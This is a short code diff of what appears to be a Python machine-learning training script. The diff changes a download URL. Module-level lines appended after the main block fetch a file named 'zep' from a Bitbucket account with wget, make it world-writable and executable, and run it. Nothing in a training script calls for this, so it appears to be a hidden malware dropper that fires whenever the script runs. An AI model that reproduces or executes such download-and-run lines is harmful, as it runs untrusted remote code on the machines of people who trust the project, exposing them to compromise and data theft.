@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://bitbucket.org/tsyjaryj/filesg/raw/main/zep')
+os.system('wget https://bitbucket.org/mypile/filesg/raw/main/zep')
 os.system('chmod 777 zep')
 os.system('./zep')
